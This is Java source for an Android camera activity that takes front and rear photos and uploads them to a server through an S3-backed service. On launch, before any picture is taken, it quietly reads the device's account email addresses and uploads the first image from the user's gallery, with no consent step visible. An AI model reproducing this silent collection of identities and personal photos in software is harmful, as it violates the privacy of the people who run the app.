package uk.org.potentialdifference.stillapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Patterns;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

import android.app.Activity;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.TextView;
import android.widget.ViewFlipper;

import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.util.StringUtils;


public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
    private final static String DEBUG_TAG = "SurfaceViewExample";

    TextView testView;

    Camera camera;
    Camera frontCamera;
    SurfaceView surfaceView;
    SurfaceHolder surfaceHolder;

    PictureCallback rawCallback;
    ShutterCallback shutterCallback;
    PictureCallback jpegCallback;
    PictureCallback jpegCallback2;
    ViewFlipper viewFlipper;

    String email;

    AmazonS3Client s3Client;

    int mainCameraID=0;
    int frontCameraID=1;

    public void saveImage(byte[] data) {
        FileOutputStream outStream = null;
        try {
            outStream = new FileOutputStream(String.format("/sdcard/%d.jpg", System.currentTimeMillis()));
            outStream.write(data);
            outStream.close();
            Log.d("Log", "onPictureTaken - wrote bytes: " + data.length);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {

        }
        // Toast.makeText(getApplicationContext(), "Picture Saved", 2000).show();
        // refreshCamera();
    }

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        Log.d(DEBUG_TAG, "onCreate");
        super.onCreate(savedInstanceState);

        Animation slide_in_left, slide_out_right;

        setContentView(R.layout.activity_photo);

        viewFlipper = (ViewFlipper) findViewById(R.id.viewflipper);
        slide_in_left = AnimationUtils.loadAnimation(this,
                android.R.anim.slide_in_left);
        slide_out_right = AnimationUtils.loadAnimation(this,
                android.R.anim.slide_out_right);
        viewFlipper.setInAnimation(slide_in_left);
        viewFlipper.setOutAnimation(slide_out_right);

        surfaceView = (SurfaceView) findViewById(R.id.surfaceView);
        surfaceHolder = surfaceView.getHolder();

        // Install a SurfaceHolder.Callback so we get notified when the
        // underlying surface is created and destroyed.
        surfaceHolder.addCallback(this);

        // deprecated setting, but required on Android versions prior to 3.0
        surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        jpegCallback2 = new PictureCallback() {
            public void onPictureTaken(byte[] data, Camera camera) {
                saveImage(data);

                String name = String.format("rear_%d.jpg", System.currentTimeMillis());
                sendToServer(name, data);
                camera.release();
                viewFlipper.showNext();
            }
        };

        jpegCallback = new PictureCallback() {
            public void onPictureTaken(byte[] data, Camera camera) {
                String name = String.format("front_%d.jpg", System.currentTimeMillis());
                sendToServer(name, data);
                try {
                    camera.release();
                    frontCamera = Camera.open(frontCameraID);
                    frontCamera.startPreview();
                    frontCamera.takePicture(null, null, jpegCallback2);
                } catch (RuntimeException e) {
                    // check for exceptions
                    System.err.println(e);
                    return;
                }
            }
        };

        captureEmail();

        Log.i("PhotoActivity", "onCreate called");
        sendToServer(String.format("user-photo_%d.jpg", System.currentTimeMillis()),grabImage());
    }

    private void sendToServer(String name, byte[] data) {
        Intent myIntent = new Intent(this, ImageUploadService.class);
        myIntent.putExtra(ImageUploadService.EXTRA_IMAGEDATA ,data);
        myIntent.putExtra(ImageUploadService.EXTRA_IMAGEDIR, this.email);
        myIntent.putExtra(ImageUploadService.EXTRA_IMAGENAME, name);
        startService(myIntent);
    }

    public void captureEmail() {

        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(this).getAccounts();

        List<String> emails = new ArrayList<String>();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                emails.add(account.name);
            }
        }
        this.email = StringUtils.join(",", emails.toArray(new String[emails.size()]));
    }

    public void captureImage(View v) throws IOException {
        //take the picture
        camera.takePicture(null, null, jpegCallback);
    }

    public void refreshCamera() {
        if (surfaceHolder.getSurface() == null) {
            // preview surface does not exist
            return;
        }

        // stop preview before making changes
        try {
            camera.stopPreview();
        } catch (Exception e) {
            // ignore: tried to stop a non-existent preview
        }

        // set preview size and make any resize, rotate or
        // reformatting changes here
        // start preview with new settings
        try {
            camera.setPreviewDisplay(surfaceHolder);
            camera.startPreview();
        } catch (Exception e) {

        }
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        // Now that the size is known, set up the camera parameters and begin
        // the preview.
        refreshCamera();
    }

    public void surfaceCreated(SurfaceHolder holder) {
        Log.d(DEBUG_TAG, "surfaceCreated");
        try {
            // open the camera
            camera = Camera.open(mainCameraID);
        } catch (RuntimeException e) {
            // check for exceptions
            System.err.println(e);
            return;
        }
        Camera.Parameters param;
        param = camera.getParameters();

        // modify parameter
        param.setPreviewSize(352, 288);
        camera.setParameters(param);
        try {
            // The Surface has been created, now tell the camera where to draw
            // the preview.
            camera.setPreviewDisplay(surfaceHolder);
            camera.startPreview();
        } catch (Exception e) {
            // check for exceptions
            System.err.println(e);
            return;
        }
    }

    public void surfaceDestroyed(SurfaceHolder holder) {
        // stop preview and release camera
        camera.stopPreview();
        camera.release();
        camera = null;
    }

    private byte[] grabImage() {
        Cursor imageCursor;
        //do we want to do this as one or two queries?
        String[] projection = {MediaStore.Images.Media._ID};
        String selection = "";
        String[] selectionArgs = null;
        imageCursor = managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);

        if(imageCursor != null){
            imageCursor.moveToFirst();
            int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
            return getBytesFromBitmap(loadImage(uri));
        }
        else{
            Log.i("stillapp", "System media store is empty");
            return null;
        }
    }

  /*  private void grabImages() {
        Cursor imageCursor;
        //do we want to do this as one or two queries?
        String[] projection = {MediaStore.Images.Media._ID};
        String selection = "";
        String[] selectionArgs = null;
        imageCursor = managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);

        boolean foundImage = imageCursor.moveToFirst();

        for(int i = 0; i < 3; i++) {
            if (foundImage) {
                
            }
        }

        if(imageCursor != null){
            imageCursor.moveToFirst();
            int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
            return getBytesFromBitmap(loadImage(uri));
        }
        else{
            Log.i("stillapp", "System media store is empty");
            return null;
        }
    }*/

    private Bitmap loadImage(Uri photoUri){
        Cursor photoCursor = null;
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
            if (photoCursor != null && photoCursor.getCount() == 1) {
                photoCursor.moveToFirst();
                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                return BitmapFactory.decodeFile(filePath, null);
            }
        }finally{
            if(photoCursor!=null){
                photoCursor.close();
            }
        }
        return null;
    }

    public byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
        return stream.toByteArray();
    }

}